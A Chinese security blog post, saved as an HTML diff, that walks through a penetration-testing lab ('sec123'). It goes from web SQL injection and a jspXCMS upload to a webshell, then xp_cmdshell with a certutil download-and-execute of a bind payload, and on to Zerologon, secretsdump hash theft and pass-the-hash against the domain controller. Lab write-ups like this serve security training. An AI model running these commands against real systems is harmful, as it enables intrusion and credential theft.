@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            外网打点到内网域靶场-sec123 |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"The price of doing the same old thing is far higher than the price of change."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">外网打点到内网域靶场-sec123</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2023-10-17 13:50:30</span>
+        <span class="mobile">2023-10-17 13:50</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/">完整渗透测试靶场</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/TomexamSql%E6%B3%A8%E5%85%A5/">TomexamSql注入</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/jspXCMS%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">jspXCMS后台任意文件上传</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93GetShell/">数据库GetShell</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CVE-2020-1472/">CVE-2020-1472</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.1k 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h1><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="/2023/10/17/sec123/image-20240128151030873.png" alt="image-20240128151030873"></p>
+<p>PS：该靶场作者：<a class="link" target="_blank" rel="noopener" href="https://www.moonsec.com/">暗月<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="VSP设置"><a href="#VSP设置" class="headerlink" title="VSP设置"></a>VSP设置</h2><p>这里用<code>192.168.0.1/24</code>网段代替外网，VPS地址为<code>192.168.0.208</code>。</p>
+<p>服务端：</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frps.toml</span></span><br><span class="line"><span class="attr">bindPort</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frpc.toml</span></span><br><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;192.168.0.208&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;javaweb1&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">8878</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">8878</span></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;javaweb2&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">8088</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">8088</span></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;javaweb3&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">8099</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">8099</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p- 192.168.0.208</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org )</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.208</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line">Not shown: 65530 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE              VERSION</span><br><span class="line">22/tcp   open  ssh                  OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">7000/tcp open  ssl/afs3-fileserver?</span><br><span class="line">8088/tcp open  http                 Apache Tomcat 8.5.76</span><br><span class="line">8878/tcp open  http                 Apache Tomcat 8.5.76</span><br><span class="line">8899/tcp open  ospf-lite?</span><br><span class="line"></span><br><span class="line">MAC Address: 00:0C:29:6F:46:67 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 65.04 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">200     1KB  http://192.168.0.208:8088/favicon.ico</span><br><span class="line">302     0B   http://192.168.0.208:8088/fckeditor    -&gt; REDIRECTS TO: /fckeditor/</span><br><span class="line">200   129B   http://192.168.0.208:8088/fckeditor/editor/filemanager/connectors/asp/upload.asp</span><br><span class="line">200   129B   http://192.168.0.208:8088/fckeditor/editor/filemanager/connectors/aspx/upload.aspx</span><br><span class="line">200   129B   http://192.168.0.208:8088/fckeditor/editor/filemanager/connectors/aspx/connector.aspx</span><br><span class="line">200   129B   http://192.168.0.208:8088/fckeditor/editor/filemanager/connectors/php/upload.php</span><br><span class="line">200   129B   http://192.168.0.208:8088/fckeditor/editor/filemanager/connectors/php/connector.php</span><br><span class="line">200   129B   http://192.168.0.208:8088/fckeditor/editor/filemanager/connectors/asp/connector.asp</span><br><span class="line">302     0B   http://192.168.0.208:8088/files    -&gt; REDIRECTS TO: /files/</span><br><span class="line">302     0B   http://192.168.0.208:8088/inc    -&gt; REDIRECTS TO: /inc/</span><br><span class="line">200     2KB  http://192.168.0.208:8088/login.jsp</span><br><span class="line">200     4B   http://192.168.0.208:8088/page</span><br><span class="line">200     4KB  http://192.168.0.208:8088/register.jsp</span><br><span class="line">302     0B   http://192.168.0.208:8088/skins    -&gt; REDIRECTS TO: /skins/</span><br><span class="line">302     0B   http://192.168.0.208:8088/upload    -&gt; REDIRECTS TO: /upload/</span><br><span class="line">302     0B   http://192.168.0.208:8088/userfiles    -&gt; REDIRECTS TO: /userfiles/</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h2 id="Tomexam-Sql注入"><a href="#Tomexam-Sql注入" class="headerlink" title="Tomexam Sql注入"></a>Tomexam Sql注入</h2><p>注册Tomexam后登录：</p>
+<p><img src="/2023/10/17/sec123/image-20240128151103495.png" alt="image-20240128151103495"></p>
+<p>以下地址存在SQL注入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.208:8088/page.do?action=comm_news&amp;act=list&amp;classid=2 and 1=1</span><br><span class="line">192.168.0.208:8088/page.do?action=comm_news&amp;act=list&amp;classid=2 and 1=2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151111105.png" alt="image-20240128151111105"></p>
+<p><img src="/2023/10/17/sec123/image-20240128151116643.png" alt="image-20240128151116643"></p>
+<p>sqlmap验证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151132277.png" alt="image-20240128151132277"></p>
+<p>sqlmap拿到该系统的管理员密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt --batch -D tomexam -T tm_admin --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151209412.png" alt="image-20240128151209412"></p>
+<p><img src="/2023/10/17/sec123/image-20240128151224003.png" alt="image-20240128151224003"></p>
+<h1 id="jspXCMS任意文件上传"><a href="#jspXCMS任意文件上传" class="headerlink" title="jspXCMS任意文件上传"></a>jspXCMS任意文件上传</h1><p>后台没找到利用点，利用SQL注入拿到jspXCMS后台的密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt --batch -D jspxcms -T cms_user --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151235166.png" alt="image-20240128151235166"></p>
+<p>拿到jspXCMS的源码后，通过正向加密的函数，进行密码碰撞，得到明文：<code>zzz123zzz</code>。</p>
+<p>jspXCMS在<code>FBI</code>靶场中通过文件上传加上目录穿越拿到shell，这里也一样：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cf shell.war ./shell.jsp </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151242413.png" alt="image-20240128151242413"></p>
+<p><img src="/2023/10/17/sec123/image-20240128151307477.png" alt="image-20240128151307477"></p>
+<p>这里的上级目录得多试几次，最终是：<code>../../../../</code>。</p>
+<p><img src="/2023/10/17/sec123/image-20240128151325432.png" alt="image-20240128151325432"></p>
+<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151332551.png" alt="image-20240128151332551"></p>
+<h1 id="数据库服务器"><a href="#数据库服务器" class="headerlink" title="数据库服务器"></a>数据库服务器</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>直接通过冰蝎自带反弹shell功能上线CS。</p>
+<p><img src="/2023/10/17/sec123/image-20240128151341020.png" alt="image-20240128151341020"></p>
+<p>上传fscan扫描第二台服务:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell fscan.exe -np -p 1-65535 -h 192.168.188.139 -no</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151348107.png" alt="image-20240128151348107"></p>
+<h2 id="数据库GetShell"><a href="#数据库GetShell" class="headerlink" title="数据库GetShell"></a>数据库GetShell</h2><p>数据库用户密码为弱口令，MDUT数据库利用工具代理连接：</p>
+<p><img src="/2023/10/17/sec123/image-20240128151422168.png" alt="image-20240128151422168"></p>
+<p>激活<code>xpcmdshell</code>，执行命令：</p>
+<p><img src="/2023/10/17/sec123/image-20240128151438540.png" alt="image-20240128151438540"></p>
+<p><img src="/2023/10/17/sec123/image-20240128151445265.png" alt="image-20240128151445265"></p>
+<p>下载执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://192.168.188.138:8899/bind4444.exe C:/ProgramData/bind.exe </span><br><span class="line"><span class="built_in">dir</span>  <span class="string">&quot;C:/ProgramData&quot;</span></span><br><span class="line">C:/ProgramData/bind.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151501592.png" alt="image-20240128151501592"></p>
+<p><img src="/2023/10/17/sec123/image-20240128151507747.png" alt="image-20240128151507747"></p>
+<p>CS正向连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.188.139 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151515016.png" alt="image-20240128151515016"></p>
+<p><img src="/2023/10/17/sec123/image-20240128151521845.png" alt="image-20240128151521845"></p>
+<p><code>SpoolSystem 注入</code>提权：</p>
+<p><img src="/2023/10/17/sec123/image-20240128151530252.png" alt="image-20240128151530252"></p>
+<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151543366.png" alt="image-20240128151543366"></p>
+<h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>注入域用户进程，信息收集：</p>
+<p><img src="/2023/10/17/sec123/image-20240128151553162.png" alt="image-20240128151553162"></p>
+<p>抓取明文：</p>
+<p><img src="/2023/10/17/sec123/image-20240128151601538.png" alt="image-20240128151601538"></p>
+<h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><h3 id="1、获取DC主机名"><a href="#1、获取DC主机名" class="headerlink" title="1、获取DC主机名"></a>1、获取DC主机名</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151608689.png" alt="image-20240128151608689"></p>
+<h3 id="2、连接DC清空凭据"><a href="#2、连接DC清空凭据" class="headerlink" title="2、连接DC清空凭据"></a>2、连接DC清空凭据</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python cve-<span class="number">2020</span>-<span class="number">1472</span>-exploit.py ad01 <span class="number">10</span>.<span class="number">10</span>.<span class="number">12</span>.<span class="number">139</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151617706.png" alt="image-20240128151617706"></p>
+<h3 id="3、获取域内Hash"><a href="#3、获取域内Hash" class="headerlink" title="3、获取域内Hash"></a>3、获取域内Hash</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-<span class="number">0</span>.<span class="number">10</span>.<span class="number">0</span>/examples/secretsdump.py ad01\$@<span class="number">10</span>.<span class="number">10</span>.<span class="number">12</span>.<span class="number">139</span> -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151631880.png" alt="image-20240128151631880"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:81220c729f6ccb63d782a77007550f74:::</span><br></pre></td></tr></table></figure>
+
+<h3 id="4、通过Hash连接域控"><a href="#4、通过Hash连接域控" class="headerlink" title="4、通过Hash连接域控"></a>4、通过Hash连接域控</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-<span class="number">0</span>.<span class="number">10</span>.<span class="number">0</span>/examples/psexec.py -hashes :<span class="number">81220</span>c729f6ccb63d782a77007550f74 sec123.cnk/administrator@<span class="number">10</span>.<span class="number">10</span>.<span class="number">12</span>.<span class="number">139</span> -c ./sec.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151644368.png" alt="image-20240128151644368"></p>
+<p>Server2012创建转发上线监听器，<code>PSEXE</code>执行CS上线：</p>
+<p><img src="/2023/10/17/sec123/image-20240128151650488.png" alt="image-20240128151650488"></p>
+<p><img src="/2023/10/17/sec123/image-20240128151707647.png" alt="image-20240128151707647"></p>
+<h3 id="5、恢复密码"><a href="#5、恢复密码" class="headerlink" title="5、恢复密码"></a>5、恢复密码</h3><p>CS计算机账号原始Hash并保存为以下文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell reg save HKLM\SYSTEM system.save</span><br><span class="line">shell reg save HKLM\SAM sam.save</span><br><span class="line">shell reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure>
+
+<p>使用这些文件获取机器账户原来的Hash值：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ../impacket-0.10.0/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151718853.png" alt="image-20240128151718853"></p>
+<p>拿到<code>$MACHINE.ACC</code>的第二段：<code>f896fa6f8d17ccdd863579bd2a9c5188</code>。</p>
+<p>使用<a class="link" target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">zerologon<i class="fas fa-external-link-alt"></i></a>工具还原机器账户哈希。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python ../zerologon-master/reinstall_original_pw.py ad01 10.10.12.139 f896fa6f8d17ccdd863579bd2a9c5188</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151734744.png" alt="image-20240128151734744"></p>
+<p>验证空密码是否恢复：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-0.10.0/examples/secretsdump.py ad01\<span class="variable">$@10</span>.10.12.139 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151742818.png" alt="image-20240128151742818"></p>
+<p>验证机器账户Hash是否正常：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ../impacket-0.10.0/examples/secretsdump.py ad01\<span class="variable">$@10</span>.10.12.139 -just-dc -hashes f896fa6f8d17ccdd863579bd2a9c5188</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151759781.png" alt="image-20240128151759781"></p>
+<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/17/sec123/image-20240128151754087.png" alt="image-20240128151754087"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/TomexamSql%E6%B3%A8%E5%85%A5/">#TomexamSql注入</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/jspXCMS%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">#jspXCMS后台任意文件上传</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93GetShell/">#数据库GetShell</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CVE-2020-1472/">#CVE-2020-1472</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/10/11/NASA/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">外网打点到内网域靶场-NASA</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
